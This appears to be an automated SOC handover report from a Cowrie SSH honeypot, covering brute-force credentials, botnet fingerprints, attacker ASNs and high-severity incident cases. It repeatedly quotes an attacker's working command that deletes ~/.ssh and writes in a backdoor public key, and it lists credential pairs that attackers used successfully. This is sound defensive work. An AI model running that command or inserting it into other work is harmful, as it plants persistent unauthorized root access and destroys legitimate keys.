# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-21 |
| **Generated At** | 2026-05-21T12:47:42Z |
| **Shift Time** | 12:47 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **207** |
| Confirmed Threats | **196** |
| False Positives Filtered | **11** (5.3%) |
| Unique Attacker IPs | **31** |
| Countries of Origin | **18** |
| High Severity Cases | **68** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **139** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **152** |
| Unique Credential Pairs | **72** |
| Unique Usernames | **42** |
| Unique Passwords | **63** |
| Successful Auth Pairs | **41** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 67 |
| `345gs5662d34` | 34 |
| `mao` | 3 |
| `hayashi` | 2 |
| `zuotian` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 34 |
| `3245gs5662d34` | 34 |
| `123456` | 13 |
| `mao123` | 3 |
| `Dd112211` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 34 |
| `root` | `3245gs5662d34` | 34 |
| `mao` | `mao123` | 3 |
| `root` | `Dd112211` | 3 |
| `hayashi` | `123456` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `3245gs5662d34` | `103.143.238.100` | 2026-05-21T09:48:55 |
| `root` | `199111` | `193.180.208.5` | 2026-05-21T09:49:20 |
| `root` | `3245gs5662d34` | `193.180.208.5` | 2026-05-21T09:49:24 |
| `root` | `seagroup` | `102.88.137.80` | 2026-05-21T09:51:56 |
| `root` | `3245gs5662d34` | `102.88.137.80` | 2026-05-21T09:52:02 |
| `root` | `Dd112211` | `79.36.191.212` | 2026-05-21T09:54:08 |
| `root` | `3245gs5662d34` | `79.36.191.212` | 2026-05-21T09:54:11 |
| `root` | `gh001` | `102.88.137.80` | 2026-05-21T09:54:42 |
| `root` | `2025` | `102.88.137.80` | 2026-05-21T09:55:22 |
| `root` | `19980101` | `207.180.229.239` | 2026-05-21T09:55:29 |
| `root` | `it001` | `31.58.87.216` | 2026-05-21T09:55:33 |
| `root` | `3245gs5662d34` | `207.180.229.239` | 2026-05-21T09:55:33 |
| `root` | `3245gs5662d34` | `31.58.87.216` | 2026-05-21T09:56:06 |
| `root` | `Dd112211` | `207.180.229.239` | 2026-05-21T09:56:33 |
| `root` | `Dd112211` | `102.88.137.80` | 2026-05-21T09:56:38 |
| `root` | `19980101` | `5.182.83.231` | 2026-05-21T10:00:17 |
| `root` | `3245gs5662d34` | `5.182.83.231` | 2026-05-21T10:00:21 |
| `root` | `sms123456` | `102.88.137.80` | 2026-05-21T10:01:14 |
| `root` | `lazada` | `102.88.137.80` | 2026-05-21T10:01:51 |
| `root` | `20230520` | `102.88.137.80` | 2026-05-21T10:02:29 |
| `root` | `world` | `102.88.137.80` | 2026-05-21T10:03:07 |
| `root` | `199111` | `5.182.83.231` | 2026-05-21T10:03:31 |
| `root` | `qwe123ASD` | `101.36.117.234` | 2026-05-21T11:53:06 |
| `root` | `3245gs5662d34` | `101.36.117.234` | 2026-05-21T11:53:09 |
| `root` | `Qaz123!` | `101.36.117.234` | 2026-05-21T11:54:24 |
| `root` | `1515` | `101.36.117.234` | 2026-05-21T11:55:38 |
| `root` | `1221` | `101.36.117.234` | 2026-05-21T11:56:50 |
| `root` | `Zxcv1234` | `101.36.117.234` | 2026-05-21T11:59:17 |
| `root` | `dupa123` | `101.36.117.234` | 2026-05-21T12:04:15 |
| `root` | `1Qaz2Wsx3Edc` | `101.36.117.234` | 2026-05-21T12:06:54 |
| `root` | `leilei` | `101.36.117.234` | 2026-05-21T12:08:08 |
| `root` | `Welkom123` | `101.36.117.234` | 2026-05-21T12:09:20 |
| `root` | `123456qwerty` | `101.36.117.234` | 2026-05-21T12:10:34 |
| `root` | `pepe1234` | `101.36.117.234` | 2026-05-21T12:11:49 |
| `root` | `a123456/` | `101.36.117.234` | 2026-05-21T12:13:05 |
| `root` | `qwe123QWE!@#` | `101.36.117.234` | 2026-05-21T12:16:45 |
| `root` | `12345678A` | `101.36.117.234` | 2026-05-21T12:19:27 |
| `root` | `alfonso` | `101.36.117.234` | 2026-05-21T12:22:02 |
| `root` | `1977` | `101.36.117.234` | 2026-05-21T12:23:16 |
| `root` | `Admin1` | `101.36.117.234` | 2026-05-21T12:24:32 |
| `root` | `1q2w3e4r?` | `101.36.117.234` | 2026-05-21T12:27:03 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **207** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 153 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 96 | 7 |
| `713bd9cc9355...` | Mirai/variant | 36 | 1 |
| `03a80b21afa8...` | Modern SSH client | 20 | 2 |
| `e37f354a101a...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 96 | 7 | Mirai/variant |
| `713bd9cc9355...` | libssh | 36 | 1 | Mirai/variant |
| `03a80b21afa8...` | libssh | 20 | 2 | Modern SSH client |
| `e37f354a101a...` | libssh | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 34 | 8 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `79.36.191.212`, `103.143.238.100`, `207.180.229.239`, `5.182.83.231`, `31.58.87.216`, `102.88.137.80`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **31** |
| Unique ASNs | **27** |
| High-Risk ASNs | **19** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 2 | LOW |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS16509` | Amazon.com, Inc. | 2 | HIGH |
| `AS12436` | Bergon Internet Ltd. | 1 | MEDIUM |
| `AS51167` | Contabo GmbH | 1 | HIGH |
| `AS200845` | AVATEL TELECOM, SA | 1 | HIGH |
| `AS55470` | Cyfuture India Pvt. Ltd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (68)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-9e9f4b4af1a1

| Field | Detail |
|---|---|
| **Source IP** | `103.143.238[.]100` |
| **First Seen** | 2026-05-21 09:48 |
| **Last Seen** | 2026-05-21 09:48 |
| **Session Duration** | 7s |
| **Login Attempts** | 0 |
| **Auth Success** | ❌ No |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 09:48:50` | `cowrie.session.params` |
| `2026-05-21 09:48:50` | `cowrie.command.input` |
| `2026-05-21 09:48:50` | `cowrie.command.failed` |
| `2026-05-21 09:48:51` | `cowrie.log.closed` |
| `2026-05-21 09:48:51` | `cowrie.session.params` |
| `2026-05-21 09:48:51` | `cowrie.command.input` |
| `2026-05-21 09:48:51` | `cowrie.session.file_download` |
| `2026-05-21 09:48:51` | `cowrie.log.closed` |
| `2026-05-21 09:48:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.238[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.143.238[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7def571d6918

| Field | Detail |
|---|---|
| **Source IP** | `103.143.238[.]100` |
| **First Seen** | 2026-05-21 09:48 |
| **Last Seen** | 2026-05-21 09:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 09:48:54` | `cowrie.session.connect` |
| `2026-05-21 09:48:54` | `cowrie.client.version` |
| `2026-05-21 09:48:54` | `cowrie.client.kex` |
| `2026-05-21 09:48:55` | `cowrie.login.success` |
| `2026-05-21 09:48:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.238[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.143.238[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26815573dc1a

| Field | Detail |
|---|---|
| **Source IP** | `193.180.208[.]5` |
| **First Seen** | 2026-05-21 09:49 |
| **Last Seen** | 2026-05-21 09:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 09:49:19` | `cowrie.session.connect` |
| `2026-05-21 09:49:19` | `cowrie.client.version` |
| `2026-05-21 09:49:20` | `cowrie.client.kex` |
| `2026-05-21 09:49:20` | `cowrie.login.success` |
| `2026-05-21 09:49:20` | `cowrie.session.params` |
| `2026-05-21 09:49:20` | `cowrie.command.input` |
| `2026-05-21 09:49:20` | `cowrie.command.failed` |
| `2026-05-21 09:49:21` | `cowrie.log.closed` |
| `2026-05-21 09:49:21` | `cowrie.session.params` |
| `2026-05-21 09:49:21` | `cowrie.command.input` |
| `2026-05-21 09:49:21` | `cowrie.session.file_download` |
| `2026-05-21 09:49:21` | `cowrie.log.closed` |
| `2026-05-21 09:49:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.180.208[.]5` to AbuseIPDB if not already reported
- [ ] Block `193.180.208[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92030f052d13

| Field | Detail |
|---|---|
| **Source IP** | `193.180.208[.]5` |
| **First Seen** | 2026-05-21 09:49 |
| **Last Seen** | 2026-05-21 09:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 09:49:23` | `cowrie.session.connect` |
| `2026-05-21 09:49:23` | `cowrie.client.version` |
| `2026-05-21 09:49:23` | `cowrie.client.kex` |
| `2026-05-21 09:49:24` | `cowrie.login.success` |
| `2026-05-21 09:49:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.180.208[.]5` to AbuseIPDB if not already reported
- [ ] Block `193.180.208[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6be1b0d0924

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-21 09:51 |
| **Last Seen** | 2026-05-21 09:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 09:51:55` | `cowrie.session.connect` |
| `2026-05-21 09:51:55` | `cowrie.client.version` |
| `2026-05-21 09:51:55` | `cowrie.client.kex` |
| `2026-05-21 09:51:56` | `cowrie.login.success` |
| `2026-05-21 09:51:57` | `cowrie.session.params` |
| `2026-05-21 09:51:57` | `cowrie.command.input` |
| `2026-05-21 09:51:57` | `cowrie.command.failed` |
| `2026-05-21 09:51:57` | `cowrie.log.closed` |
| `2026-05-21 09:51:57` | `cowrie.session.params` |
| `2026-05-21 09:51:57` | `cowrie.command.input` |
| `2026-05-21 09:51:58` | `cowrie.session.file_download` |
| `2026-05-21 09:51:58` | `cowrie.log.closed` |
| `2026-05-21 09:52:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eaaab38079a2

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-21 09:52 |
| **Last Seen** | 2026-05-21 09:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 09:52:01` | `cowrie.session.connect` |
| `2026-05-21 09:52:01` | `cowrie.client.version` |
| `2026-05-21 09:52:01` | `cowrie.client.kex` |
| `2026-05-21 09:52:02` | `cowrie.login.success` |
| `2026-05-21 09:52:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81139a3d412a

| Field | Detail |
|---|---|
| **Source IP** | `79.36.191[.]212` |
| **First Seen** | 2026-05-21 09:54 |
| **Last Seen** | 2026-05-21 09:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 09:54:07` | `cowrie.session.connect` |
| `2026-05-21 09:54:07` | `cowrie.client.version` |
| `2026-05-21 09:54:07` | `cowrie.client.kex` |
| `2026-05-21 09:54:08` | `cowrie.login.success` |
| `2026-05-21 09:54:08` | `cowrie.session.params` |
| `2026-05-21 09:54:08` | `cowrie.command.input` |
| `2026-05-21 09:54:08` | `cowrie.command.failed` |
| `2026-05-21 09:54:08` | `cowrie.log.closed` |
| `2026-05-21 09:54:09` | `cowrie.session.params` |
| `2026-05-21 09:54:09` | `cowrie.command.input` |
| `2026-05-21 09:54:09` | `cowrie.session.file_download` |
| `2026-05-21 09:54:09` | `cowrie.log.closed` |
| `2026-05-21 09:54:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.36.191[.]212` to AbuseIPDB if not already reported
- [ ] Block `79.36.191[.]212` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-629cdd150b59

| Field | Detail |
|---|---|
| **Source IP** | `79.36.191[.]212` |
| **First Seen** | 2026-05-21 09:54 |
| **Last Seen** | 2026-05-21 09:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 09:54:11` | `cowrie.session.connect` |
| `2026-05-21 09:54:11` | `cowrie.client.version` |
| `2026-05-21 09:54:11` | `cowrie.client.kex` |
| `2026-05-21 09:54:11` | `cowrie.login.success` |
| `2026-05-21 09:54:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.36.191[.]212` to AbuseIPDB if not already reported
- [ ] Block `79.36.191[.]212` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3932844c3c39

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-21 09:54 |
| **Last Seen** | 2026-05-21 09:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 09:54:41` | `cowrie.session.connect` |
| `2026-05-21 09:54:41` | `cowrie.client.version` |
| `2026-05-21 09:54:41` | `cowrie.client.kex` |
| `2026-05-21 09:54:42` | `cowrie.login.success` |
| `2026-05-21 09:54:43` | `cowrie.session.params` |
| `2026-05-21 09:54:43` | `cowrie.command.input` |
| `2026-05-21 09:54:43` | `cowrie.command.failed` |
| `2026-05-21 09:54:43` | `cowrie.log.closed` |
| `2026-05-21 09:54:43` | `cowrie.session.params` |
| `2026-05-21 09:54:43` | `cowrie.command.input` |
| `2026-05-21 09:54:44` | `cowrie.session.file_download` |
| `2026-05-21 09:54:44` | `cowrie.log.closed` |
| `2026-05-21 09:54:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78dc21c08b3a

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-21 09:54 |
| **Last Seen** | 2026-05-21 09:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 09:54:47` | `cowrie.session.connect` |
| `2026-05-21 09:54:47` | `cowrie.client.version` |
| `2026-05-21 09:54:47` | `cowrie.client.kex` |
| `2026-05-21 09:54:48` | `cowrie.login.success` |
| `2026-05-21 09:54:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af2e5c33d143

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-21 09:55 |
| **Last Seen** | 2026-05-21 09:55 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 09:55:21` | `cowrie.session.connect` |
| `2026-05-21 09:55:21` | `cowrie.client.version` |
| `2026-05-21 09:55:21` | `cowrie.client.kex` |
| `2026-05-21 09:55:22` | `cowrie.login.success` |
| `2026-05-21 09:55:23` | `cowrie.session.params` |
| `2026-05-21 09:55:23` | `cowrie.command.input` |
| `2026-05-21 09:55:23` | `cowrie.command.failed` |
| `2026-05-21 09:55:23` | `cowrie.log.closed` |
| `2026-05-21 09:55:24` | `cowrie.session.params` |
| `2026-05-21 09:55:24` | `cowrie.command.input` |
| `2026-05-21 09:55:24` | `cowrie.session.file_download` |
| `2026-05-21 09:55:24` | `cowrie.log.closed` |
| `2026-05-21 09:55:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46c62c1f1b64

| Field | Detail |
|---|---|
| **Source IP** | `31.58.87[.]216` |
| **First Seen** | 2026-05-21 09:55 |
| **Last Seen** | 2026-05-21 09:56 |
| **Session Duration** | 44s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

